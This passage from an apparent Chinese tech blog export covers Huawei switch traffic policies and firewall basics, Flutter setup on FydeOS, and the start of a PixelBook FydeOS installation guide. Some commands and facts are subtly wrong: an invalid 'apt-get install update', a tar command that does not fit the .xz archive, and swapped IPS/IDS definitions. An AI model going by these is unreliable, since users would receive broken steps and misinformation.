<p>流策略traffic policy</p>
<ol>
<li>配置流分类，定义报文匹配协议</li>
<li>配置流行为，确定处理动作</li>
<li>配置流策略，为流分类绑定流行为</li>
<li>应用流策略</li>
</ol>
<h3 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h3><blockquote>
<p>在某些需要指定特定的数据流走特定的下一跳的场景下 可以使用策略路由实现</p>
</blockquote>
<ul>
<li>例  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 10网段的用户通过高速链路访问外网</span></span><br><span class="line"><span class="comment"># 20网段的用户通过低速链路访问外网</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1 配置ACL规则 </span></span><br><span class="line">[Switch] acl <span class="number">3001</span> <span class="comment"># 高级ACL</span></span><br><span class="line">[Switch-acl-adv-<span class="number">3001</span>] rule permit ip source <span class="number">192.168</span><span class="number">.10</span><span class="number">.0</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.255</span></span><br><span class="line">[Switch] acl <span class="number">3002</span></span><br><span class="line">[Switch-acl-adv-<span class="number">3002</span>] rule permit ip source <span class="number">192.168</span><span class="number">.20</span><span class="number">.0</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.255</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2 配置流分类 </span></span><br><span class="line">[Switch] traffic classifier c1</span><br><span class="line">[Switch-classifier-c1] <span class="keyword">if</span>-match acl <span class="number">3001</span></span><br><span class="line">[Switch] traffic classifier c2</span><br><span class="line">[Switch-classifier-c2] <span class="keyword">if</span>-match acl <span class="number">3002</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3 配置流行为 </span></span><br><span class="line">[Switch] traffic behavior b1</span><br><span class="line">[Switch-behavior-b1] redirect ip-nexthop <span class="number">10.1</span><span class="number">.10</span><span class="number">.1</span></span><br><span class="line">[Switch] traffic behavior b2</span><br><span class="line">[Switch-behavior-b2] redirect ip-nexthop <span class="number">10.1</span><span class="number">.20</span><span class="number">.1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4 配置流策略</span></span><br><span class="line">[Switch] traffic policy p1</span><br><span class="line">[Switch-trafficpolicy-p1] classifier c1 behavior b1</span><br><span class="line">[Switch-trafficpolicy-p1] classifier c2 behavior b2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5 应用流策略</span></span><br><span class="line">[Switch] interface gigabitethernet <span class="number">6</span>/<span class="number">1</span>/<span class="number">10</span></span><br><span class="line">[Switch-GigabitEthernet6/<span class="number">1</span>/<span class="number">10</span>] traffic-policy p1 inbound</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="网络限速"><a href="#网络限速" class="headerlink" title="网络限速"></a>网络限速</h3><ul>
<li>基于IP网段限速</li>
</ul>
<p>可以实现多种   限速，比如基于VLAN的限速 、基于IP网段的限速等。<br>适用于需要对流量类型进行区分以保证某些应用得到充足带宽的场景。</p>
<ul>
<li>基于端口限速</li>
</ul>
<p>按照限速的方向，分为入方向的接口限速和出方向的接口限速。<br>适用于流量种类较单一或不需要对流量类型进行区分，但是网络带宽有限需要对流量限速的场景。</p>
<ul>
<li>基于Vlan限速</li>
</ul>
<hr>
<h1 id="汇总"><a href="#汇总" class="headerlink" title="汇总"></a>汇总</h1><p>将多个子网络汇总成一个大的主网络，也就是说在这个主网络中包括了多个子网络。</p>
<h2 id="不同路由的默认优先级"><a href="#不同路由的默认优先级" class="headerlink" title="不同路由的默认优先级"></a>不同路由的默认优先级</h2><table>
<thead>
<tr>
<th>路由协议或路由种类</th>
<th>华为默认优先级</th>
</tr>
</thead>
<tbody><tr>
<td>DIRECT</td>
<td>0</td>
</tr>
<tr>
<td>OSPF</td>
<td>10</td>
</tr>
<tr>
<td>IS-IS</td>
<td>15</td>
</tr>
<tr>
<td>STATIC</td>
<td>60</td>
</tr>
<tr>
<td>RIP</td>
<td>100</td>
</tr>
<tr>
<td>OSPF ASE</td>
<td>150</td>
</tr>
<tr>
<td>OSPF NSSA</td>
<td>150</td>
</tr>
<tr>
<td>IBGP</td>
<td>255</td>
</tr>
<tr>
<td>EBGP</td>
<td>255</td>
</tr>
</tbody></table>
<h2 id="汇总原因"><a href="#汇总原因" class="headerlink" title="汇总原因"></a>汇总原因</h2><p>不进行路由汇总会产生的问题：</p>
<p>1 路由表体积太大，消耗内存资源，影响查表速度<br>2 硬件资源不足，当路由条目太多并且需要检索时会消耗很多资源</p>
<h2 id="如何汇总"><a href="#如何汇总" class="headerlink" title="如何汇总"></a>如何汇总</h2><h1 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h1><p>是一个网络安全设备</p>
<h2 id="相关"><a href="#相关" class="headerlink" title="相关"></a>相关</h2><p>IPS 入侵检测服务</p>
<p>IDS 入侵防御服务</p>
<p>WAF Web应用防火墙</p>
<h2 id="作用-3"><a href="#作用-3" class="headerlink" title="作用"></a>作用</h2><p>通过配置，进行访问控制并保护网络安全</p>
<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>访问控制，身份验证，数据加密，VPN</p>
<h2 id="迭代"><a href="#迭代" class="headerlink" title="迭代"></a>迭代</h2><ol>
<li>1代每次连接都要查表 太慢了</li>
<li>代理防火墙 对每一个服务提供代理，成本高且升级困难</li>
<li>状态检测防火墙 只对一串包的第一个包进行监测</li>
<li>统一威胁管理防火墙 多了各种防护功能</li>
<li>下一代防火墙 多更多功能</li>
</ol>
<h2 id="分类——基于业务"><a href="#分类——基于业务" class="headerlink" title="分类——基于业务"></a>分类——基于业务</h2><ul>
<li>FW 内外(边界)防火墙</li>
<li>WAF防火墙 Web应用防火墙 (一般在DMZ隔离区)</li>
<li>VFW 虚拟防火墙</li>
<li>Anti-DDos 反DDoS防火墙</li>
</ul>
<h2 id="分类——基于软硬件"><a href="#分类——基于软硬件" class="headerlink" title="分类——基于软硬件"></a>分类——基于软硬件</h2><ul>
<li>硬件防火墙</li>
<li>软件防火墙</li>
<li>芯片级防火墙(特殊系统中才应用)</li>
</ul>
<h2 id="防火墙的安全区域"><a href="#防火墙的安全区域" class="headerlink" title="防火墙的安全区域"></a>防火墙的安全区域</h2><p>同一区域的数据报文不使用安全策略，只有跨区域传输才使用</p>
<p>华为默认区域：</p>
<ul>
<li>本地区域 代表防火墙本身 安全级别100 (可信度最高</li>
<li>信任区域 一般用于定义内部网络 安全级别85</li>
<li>非信任区域 一般用于定义非内部网络或互联网 安全级别5 (可信度最低</li>
<li>隔离区域 一般用于定义内部服务器所在网络 安全级别 50</li>
</ul>
<aside>
👗 本地区域不能添加任何接口，但防火墙所有接口依然属于系统预留本地区域

</aside>

<p>数据流动：</p>
<ul>
<li>入方向(inbound): 从低安全级别区域到高安全级别区域</li>
<li>出方向(outbound): 从高安全级别区域到低安全级别级别区域</li>
</ul>
<aside>
⚠️ 一个接口(可以是物理接口，也可以是逻辑接口)只能加入一个安全区域

</aside>

<h2 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h2><ul>
<li>防外不防内</li>
<li>无法防止全部安全威胁，特别是新型威胁</li>
<li>在提供深度检测与处理转发之间的性能平衡问题</li>
<li>使用p2p加密协议(如VPN)时，无法处理加密隧道</li>
</ul>
<h1 id="eNSP命令"><a href="#eNSP命令" class="headerlink" title="eNSP命令"></a>eNSP命令</h1><h2 id="display"><a href="#display" class="headerlink" title="display"></a>display</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 显示所有端口状态</span></span><br><span class="line">display interface brief</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示bgp路由表</span></span><br><span class="line">display bgp routing-table</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询流分类配置信息</span></span><br><span class="line">display traffic classifier user-defined c1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询流策略配置信息</span></span><br><span class="line">display traffic policy user-defined p1</span><br></pre></td></tr></table></figure>

<h2 id="interface"><a href="#interface" class="headerlink" title="interface"></a>interface</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 配置回环接口</span></span><br><span class="line">interface loopback 1</span><br><span class="line"><span class="comment">## 接口号 1~1024</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>NetWork</category>
      </categories>
      <tags>
        <tag>Learning</tag>
        <tag>Network</tag>
      </tags>
  </entry>
  <entry>
    <title>Fydeos 配置Flutter开发环境</title>
    <url>/2022/05/09/Fydeos%20%E9%85%8D%E7%BD%AEFlutter%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/</url>
    <content><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>Author: Elimos<br>Date Created: April 9, 2022 1:26 PM<br>Status: Done 🙌<br>Tags: ChromeOS, Coding, Devices, Flutter, Learning, Tutorial</p>
<p><a href="https://flutter.cn/docs/get-started/install/linux">在 Linux 操作系统上安装和配置 Flutter 开发环境</a></p>
<h1 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h1><h2 id="FydeOS开启Linux环境"><a href="#FydeOS开启Linux环境" class="headerlink" title="FydeOS开启Linux环境"></a>FydeOS开启Linux环境</h2><p>FydeOS使用的是基于Debian的Linux环境</p>
<ol>
<li>打开”系统设置-在左侧菜单栏-高级-开发者”中找到Linux开发环境 按照提示开启即可<span id="more"></span>
<img src="https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F47522da1-052e-4c26-b20b-51e90ae69c17%2FUntitled.png?table=block&id=1becba06-7fdf-4e7e-84d1-17dc8b41a6f1&spaceId=a06190ac-c5a8-4c56-b3ed-a0be13119ca5&width=2000&userId=9d2af0ed-9fc9-4b46-840a-8a61cda676c0&cache=v2" alt="成功开启linux开发环境后界面"></li>
</ol>
<p>成功开启linux开发环境后界面</p>
<ol>
<li>点开右侧小三角</li>
</ol>
<p><img src="https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fe147eb6d-363e-48e5-a2be-785cd4eb2e60%2FUntitled.png?table=block&id=3304a4e2-25d7-4028-9f77-829b3efb7c97&spaceId=a06190ac-c5a8-4c56-b3ed-a0be13119ca5&width=2000&userId=9d2af0ed-9fc9-4b46-840a-8a61cda676c0&cache=v2" alt="Linux环境配置"></p>
<p>Linux环境配置</p>
<ol>
<li>进入开发Andorid应用,并开启adb调试</li>
</ol>
<p><img src="https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F141a379a-b245-43d6-807b-e1ee2f821d8b%2FUntitled.png?table=block&id=3c6af1c6-b659-4556-a34d-d86193eddc8d&spaceId=a06190ac-c5a8-4c56-b3ed-a0be13119ca5&width=2000&userId=9d2af0ed-9fc9-4b46-840a-8a61cda676c0&cache=v2" alt="启用adb调试"></p>
<p>启用adb调试</p>
<h2 id="Linux环境软件源更换"><a href="#Linux环境软件源更换" class="headerlink" title="Linux环境软件源更换"></a>Linux环境软件源更换</h2><p>Fydeos中使用的debian版本为bullseye,于是笔者使用了清华大学软件源来替换官方源</p>
<p><a href="https://mirrors.tuna.tsinghua.edu.cn/help/debian/">debian | 镜像站使用帮助 | 清华大学开源软件镜像站 | Tsinghua Open Source Mirror</a></p>
<blockquote>
<p>更换镜像源</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 备份镜像源文件</span></span><br><span class="line">sudo <span class="built_in">cp</span> /etc/apt/sources.list /etc/apt/sources.list.bak </span><br><span class="line"></span><br><span class="line"><span class="comment"># 编辑镜像源文件</span></span><br><span class="line">sudo vim /etc/apt/sources.list</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改文件内容为如下内容</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#deb https://deb.debian.org/debian bullseye main</span></span><br><span class="line"><span class="comment">#deb http://deb.debian.org/debian/ bullseye main contrib non-free</span></span><br><span class="line"><span class="comment">#deb https://security.debian.org/ bullseye-security main contrib non-free</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释</span></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/debian/ bullseye main contrib non-free</span><br><span class="line"><span class="comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/debian/ bullseye main contrib non-free</span></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/debian/ bullseye-updates main contrib non-free</span><br><span class="line"><span class="comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/debian/ bullseye-updates main contrib non-free</span></span><br><span class="line"></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/debian/ bullseye-backports main contrib non-free</span><br><span class="line"><span class="comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/debian/ bullseye-backports main contrib non-free</span></span><br><span class="line"></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/debian-security bullseye-security main contrib non-free</span><br><span class="line"><span class="comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/debian-security bullseye-security main contrib non-free</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 保存退出后更新软件列表</span></span><br><span class="line">sudo apt-get install update</span><br></pre></td></tr></table></figure>

<h2 id="FydeOS开启Android环境"><a href="#FydeOS开启Android环境" class="headerlink" title="FydeOS开启Android环境"></a>FydeOS开启Android环境</h2><blockquote>
<p>在软件列表中，找到安卓设置，打开即成功开启Android环境</p>
</blockquote>
<h2 id="配置ADB环境"><a href="#配置ADB环境" class="headerlink" title="配置ADB环境"></a>配置ADB环境</h2><blockquote>
<p>在debian中安装adb工具</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install adb</span><br></pre></td></tr></table></figure>

<blockquote>
<p>验证adb环境</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb devices</span><br></pre></td></tr></table></figure>

<p>执行后，会提示</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">* daemon not running; starting now at tcp:5037</span><br><span class="line">* daemon started successfully</span><br><span class="line">List of devices attached</span><br><span class="line">emulator-5554   unauthorized</span><br></pre></td></tr></table></figure>

<p>并且会弹出adb链接确认框，勾选一律允许后确认，再执行 adb devices</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">List of devices attached</span><br><span class="line">emulator-5554   device</span><br></pre></td></tr></table></figure>

<p><strong>至此linux环境与fydeos的android环境成功打通</strong></p>
<h2 id="Linux安装VS-Code"><a href="#Linux安装VS-Code" class="headerlink" title="Linux安装VS Code"></a>Linux安装VS Code</h2><blockquote>
<p>直接官网下载 选择deb版 下载完成后点击安装即可</p>
</blockquote>
<h2 id="配置FydeOS-amp-Linux共享目录"><a href="#配置FydeOS-amp-Linux共享目录" class="headerlink" title="配置FydeOS&amp;Linux共享目录"></a>配置FydeOS&amp;Linux共享目录</h2><blockquote>
<p>笔者把下载目录与Linux进行共享，读者可根据自己的需求进行更改</p>
</blockquote>
<aside>
⚠️ 共享目录中进行文件操作容易出错，建议把文件移出到linux环境内其他目录再进行操作

</aside>

<p>在文件管理器中，右击左侧的”下载内容“文件夹，点选与Linux共享即可</p>
<p>共享后的下载目录在</p>
<p>/mnt/chromeos/MyFiles/Downloads/</p>
<p><img src="https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F5e1290ae-159f-42ac-a94f-8a87d49c93db%2FUntitled.png?table=block&id=6f98a9bb-d686-4bce-90b3-aec6e30087d6&spaceId=a06190ac-c5a8-4c56-b3ed-a0be13119ca5&width=2000&userId=9d2af0ed-9fc9-4b46-840a-8a61cda676c0&cache=v2" alt="下载目录"></p>
<hr>
<h1 id="软件准备"><a href="#软件准备" class="headerlink" title="软件准备"></a>软件准备</h1><h2 id="flutter下载"><a href="#flutter下载" class="headerlink" title="flutter下载"></a>flutter下载</h2><p>在flutter的官方下载页面<a href="https://flutter.cn/docs/get-started/install/linux">https://flutter.cn/docs/get-started/install/linux</a>中</p>
<p>找到如下界面 ，点击进行下载</p>
<p><img src="https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fc7efb065-b624-4d40-b96d-d813b2269202%2FUntitled.png?table=block&id=c59531a8-1424-4c5a-a4a1-2008696ec3f4&spaceId=a06190ac-c5a8-4c56-b3ed-a0be13119ca5&width=2000&userId=9d2af0ed-9fc9-4b46-840a-8a61cda676c0&cache=v2" alt="下载界面"></p>
<p>下载界面</p>
<p><a href="https://storage.flutter-io.cn/flutter_infra_release/releases/stable/linux/flutter_linux_2.10.4-stable.tar.xz">https://storage.flutter-io.cn/flutter_infra_release/releases/stable/linux/flutter_linux_2.10.4-stable.tar.xz</a></p>
<p>这里贴出笔者配置时使用的链接</p>
<p>下载到Fydeos后，进入linux终端</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 将下载来的flutter环境移动到/tmp目录</span></span><br><span class="line">sudo <span class="built_in">mv</span> /mnt/chromeos/MyFiles/Downloads/f[lutter_linux_2.10.4-stable.tar.xz](https://storage.flutter-io.cn/flutter_infra_release/releases/stable/linux/flutter_linux_2.10.4-stable.tar.xz) /tmp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解压flutter环境到/lib目录</span></span><br><span class="line">sudo tar -zxf /tmp/flutter_linux_2.10.4-stable.tar.xz /lib</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删掉已经解压之后没用了的压缩包</span></span><br><span class="line">sudo <span class="built_in">rm</span> /tmp/flutter_linux_2.10.4-stable.tar.xz</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将flutter添加到环境变量</span></span><br><span class="line">sudo vim /etc/profile</span><br><span class="line"><span class="comment"># 在文件末尾添加</span></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/lib/flutter/bin</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存退出 使环境变量生效</span></span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试flutter</span></span><br><span class="line">flutter doctor</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Android-Studio安装"><a href="#Android-Studio安装" class="headerlink" title="Android Studio安装"></a>Android Studio安装</h2><p><a href="https://developer.android.google.cn/studio">Download Android Studio and SDK tools | Android Developers</a></p>
<p>打开AS官网，按照提示下载，在下载内容目录直接点开进行安装即可</p>
<p>进入软件后，点不导入配置，不设置代理即可，默认安装完成即可进入软件</p>
<p><img src="https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F01fbf44e-83e5-4979-af59-89ac1cc46879%2FUntitled.png?table=block&id=6c2f2eaf-ed52-4f7e-b154-9b88d927300d&spaceId=a06190ac-c5a8-4c56-b3ed-a0be13119ca5&width=2000&userId=9d2af0ed-9fc9-4b46-840a-8a61cda676c0&cache=v2" alt="AS"></p>
<p>进入软件后，如图选SDK Manager</p>
<p><img src="https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F5a278adf-4756-432d-8bad-d1bb56d19d3a%2FUntitled.png?table=block&id=cf04aeb0-6c87-4f8c-8fc3-9e425d93f429&spaceId=a06190ac-c5a8-4c56-b3ed-a0be13119ca5&width=2000&userId=9d2af0ed-9fc9-4b46-840a-8a61cda676c0&cache=v2" alt="SDK Manager"></p>
<p>勾选Android SDK Command-line Tools(latest) 点右下角的finish，等待安装完成</p>
<h1 id="安装环境"><a href="#安装环境" class="headerlink" title="安装环境"></a>安装环境</h1><p>上一步安装完成后，打开linux终端</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 配置Andorid SDK 路径 directory处填写上图中显示的SDK位置，如笔者是/home/elimos/Android/Sdk</span></span><br><span class="line">flutter config --android-sdk &lt;directory&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 同意协议 一路y即可</span></span><br><span class="line">flutter doctor --android-licenses</span><br><span class="line"></span><br><span class="line"><span class="comment"># 验证环境</span></span><br><span class="line">flutter doctor</span><br><span class="line"></span><br><span class="line"><span class="comment">### 配置成功后提示如下</span></span><br><span class="line">elimos@penguin:~$ flutter doctor</span><br><span class="line">Doctor summary (to see all details, run flutter doctor -v):</span><br><span class="line">[✓] Flutter (Channel stable, 2.10.4, on Debian GNU/Linux 11 (bullseye)</span><br><span class="line">    5.4.151-16908-gff376e5d5ee1, locale en_US.UTF-8)</span><br><span class="line">[✓] Android toolchain - develop <span class="keyword">for</span> Android devices (Android SDK version 32.1.0-rc1)</span><br><span class="line">[✗] Chrome - develop <span class="keyword">for</span> the web (Cannot find Chrome executable at google-chrome)</span><br><span class="line">    ! Cannot find Chrome. Try setting CHROME_EXECUTABLE to a Chrome executable.</span><br><span class="line">[✓] Android Studio (version 2021.1)</span><br><span class="line">[✓] VS Code (version 1.66.0)</span><br><span class="line">[✓] Connected device (1 available)</span><br><span class="line"><span class="comment">###</span></span><br></pre></td></tr></table></figure>

<p>由于并不需要开发web应用，对于chrome的报错笔者就不理会了，至此Flutter的FydeOS开发环境搭建完成</p>
]]></content>
      <categories>
        <category>Tutorial</category>
      </categories>
      <tags>
        <tag>chromebook</tag>
        <tag>FydeOS</tag>
        <tag>Flutter</tag>
      </tags>
  </entry>
  <entry>
    <title>PixelBook 2017 安装FydeOS记录</title>
    <url>/2022/04/24/PixelBook%202017%20%E5%AE%89%E8%A3%85FydeOS%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>Author: Elimos<br>Date Created: March 24, 2022 12:54 PM<br>Reference: <a href="http://120.79.199.53/?p=24">http://120.79.199.53/?p=24</a><br>Status: Done 🙌<br>Tags: ChromeOS, Chromebook, Devices, Tutorial</p>
<aside>
📎 **目录**

</aside>

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h2 id="声明！"><a href="#声明！" class="headerlink" title="声明！"></a>声明！</h2><aside>
🔥 折腾有风险，本教程不对任何可能存在的设备损坏负责！

</aside>
<span id="more"></span>
本文引用到了[chromebook研究院](http://120.79.199.53/)ELAO的[文章](http://120.79.199.53/?p=24),未经准许,禁止转载!

<p>感谢ELAO大佬提供的教程和技术支持!</p>
<p><img src="https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F41fc58dd-a514-4042-bbf9-d041d6478ce6%2FUntitled.png?table=block&id=c18e5437-c3ab-437f-801c-9057b2c368b3&spaceId=a06190ac-c5a8-4c56-b3ed-a0be13119ca5&width=2000&userId=9d2af0ed-9fc9-4b46-840a-8a61cda676c0&cache=v2" alt="转载声明"></p>
<p>转载声明</p>
<h2 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h2><p>Pixelbook2017是一款由Google于2017年推出的一款搭载Chrome OS的360°折叠笔记本。</p>
<p>机身带有两个Type-C 接口，一个3.5mm音频I/O。</p>
<h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><p>由于某些不可描述的原因，Chrome OS并不能很好地在国内使用，因为，尝试将设备刷入<a href="http://fydeos.com/">FydeOS</a>系统，以在国内获取优秀的使用体验。</p>
<p>在此感谢FydeOS团队为ChromeOS本国化做出的巨大贡献。</p>
<h1 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h1><h2 id="设备准备"><a href="#设备准备" class="headerlink" title="设备准备"></a>设备准备</h2><p>我们需要有一台PixelBook 2017      <del>废话！不然折腾啥？</del></p>
<h3 id="线材"><a href="#线材" class="headerlink" title="线材"></a>线材</h3><p>除了设备之外，我们还需要一些线：</p>
<ul>
<li>USB Type-A 母 to Type-C 公</li>
</ul>
<blockquote>
<p>这个是为了让U盘能连接到笔记本上 毕竟这个本子不自带USB Type-A接口，当然如果你有Type-C的U盘的话，这一项可以省略</p>
</blockquote>
<ul>
<li>Type-C 公 to Type-C 公 <strong>OR</strong> Type-A 公 to Type-C 公</li>
</ul>
<blockquote>
<p>这个是为了能让笔记本断开电池的时候能够接电源，就用你的充电器+充电线就可以了</p>
</blockquote>
<h3 id="设备"><a href="#设备" class="headerlink" title="设备"></a>设备</h3><p>除了线之外，还需要一些基础设备：</p>
<ul>
<li>充电器 OR 充电头</li>
</ul>
<aside>
⚠️ 注意：供电功率一定要至少大于20W！

</aside>

<ul>
<li>U盘 <strong>OR</strong> 任意可移动媒体存储设备</li>
</ul>
<blockquote>
<p>这个是用来存放系统镜像用的</p>
</blockquote>
<ul>
<li>六角螺丝刀 T1</li>
<li>六角螺丝刀 T2</li>
</ul>
<blockquote>
<p>这个螺丝刀真的是苛刻，跑了好久才找人找到有合适的螺丝刀，不是十字螺丝就算了，还要两种型号的螺丝！</p>
</blockquote>
<ul>
<li>[ 可选 ]电吹风</li>
<li>[ 可选 ]双面胶</li>
<li>[ 可选 ]存放螺丝的容器</li>
<li>[ 可选 ]锤子</li>
</ul>
<blockquote>
<p>用来锤平顶部金属条</p>
</blockquote>
<h2 id="软体准备"><a href="#软体准备" class="headerlink" title="软体准备"></a>软体准备</h2><p>我们需要一台电脑，这里使用的是Windows11的设备</p>
<h3 id="系统"><a href="#系统" class="headerlink" title="系统"></a>系统</h3><aside>
⏰ Fydeos的FAQ

</aside>

<p><a href="https://fydeos.com/help/faq">常见问题 - FydeOS</a></p>
<ul>
<li><a href="http://fydeos.com/download">FydeOS的系统镜像</a></li>
</ul>
<blockquote>
<p>当然，你还可以选择Windows,Linux各大发行版等，这里就不一一列举了</p>
</blockquote>
<blockquote>
<p>下载下来放到自己找得到的地方就可以了</p>
</blockquote>
<h3 id="固件"><a href="#固件" class="headerlink" title="固件"></a>固件</h3><ul>
<li>seaBIOS</li>
</ul>
<blockquote>
<p>这里使用的是ChromeBook研究院的bios下载脚本部署的，不需要事先准备，查看<a href="https://mrchromebox.tech/#devices">BIOS支持列表</a></p>
</blockquote>
<h3 id="软件"><a href="#软件" class="headerlink" title="软件"></a>软件</h3><ul>
<li><p><a href="https://github.com/pbatard/rufus/releases/">Rufus</a>(github)</p>
</li>
<li><p><a href="https://rufus.en.softonic.com/?ex=CAT-3508.2">Rufus</a>(softonic分流)</p>
</li>
</ul>
<blockquote>
<p>用来给U盘写入镜像，github的链接可以下载最新版，分流方便不方便的同学</p>
</blockquote>
<ul>
<li>[ 可选 ]<a href="https://www.diskgenius.cn/download.php">DiskGenius</a></li>
</ul>
<blockquote>
<p>磁盘分区工具 不一定需要</p>
</blockquote>
<h1 id="正式开始"><a href="#正式开始" class="headerlink" title="正式开始"></a>正式开始</h1><h2 id="开启开发者模式"><a href="#开启开发者模式" class="headerlink" title="开启开发者模式"></a>开启开发者模式</h2><p>此栏参考了</p>
<p><a href="http://120.79.199.53/?p=24">Chromebook装win10教程 - chromebook研究院</a></p>
<p>想要更详细的信息请移步！</p>
<blockquote>
<p><strong>Chromebook</strong>：关机状态下，按住ESC+刷新（在ESC右边，一般是旋转图标）+电源键（2017在侧面音量键那一面最底下）</p>
</blockquote>
<p>开机后会进入这个界面</p>
<p><img src="https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fdba5935c-484e-4f79-b168-7f8f7147548a%2FUntitled.png?table=block&id=eb11dc72-4807-448d-9912-03ee346b9043&spaceId=a06190ac-c5a8-4c56-b3ed-a0be13119ca5&width=2000&userId=9d2af0ed-9fc9-4b46-840a-8a61cda676c0&cache=v2" alt="开启开发者模式界面"></p>
<p>开启开发者模式界面</p>
<blockquote>
<p>方向键左右可以切换语言</p>
</blockquote>
<blockquote>
<p>按关机或按ESC则可以当作以上一切都没发生过，退出开启开发者模式的界面</p>
</blockquote>
<p>按ENTER开启开发者模式</p>
<aside>
⚠️ 注意：请做好备份

</aside>

<p>此时机器会自己完成接下来的工作，我们只需要等待它进入系统</p>
<p><img src="https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F459579da-318c-4db4-ace8-e63c5fac3c7e%2FUntitled.png?table=block&id=0b29ecc1-9840-4cd7-b701-8a19ebfb3f78&spaceId=a06190ac-c5a8-4c56-b3ed-a0be13119ca5&width=2000&userId=9d2af0ed-9fc9-4b46-840a-8a61cda676c0&cache=v2" alt="开启开发者模式中"></p>
<p>开启开发者模式中</p>
<p><img src="https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F6bbcf321-b2bf-4d05-944a-b4652329a3e3%2FUntitled.png?table=block&id=34bafa84-6135-43bd-8962-9d00bb2dc4cf&spaceId=a06190ac-c5a8-4c56-b3ed-a0be13119ca5&width=2000&userId=9d2af0ed-9fc9-4b46-840a-8a61cda676c0&cache=v2" alt="开启开发者模式后开机"></p>
<p>开启开发者模式后开机</p>
<p>此时按Ctrl+D可以跳过这个界面，正式进入系统</p>
<blockquote>
<p>如果手贱按了空格就会重新关闭掉开发者模式</p>
</blockquote>
<h2 id="解除写保护"><a href="#解除写保护" class="headerlink" title="解除写保护"></a>解除写保护</h2><p>本栏同样参考此文章，详情可移步！</p>
<p><a href="http://120.79.199.53/?p=24">Chromebook装win10教程 - chromebook研究院</a></p>
<ul>
<li>方法一：解除CR50保护锁</li>
</ul>
<p>拆机拔掉电池排线，然后插上我们事先准备好的电源和电源线，在电池排线与主板脱离的情况下开机</p>
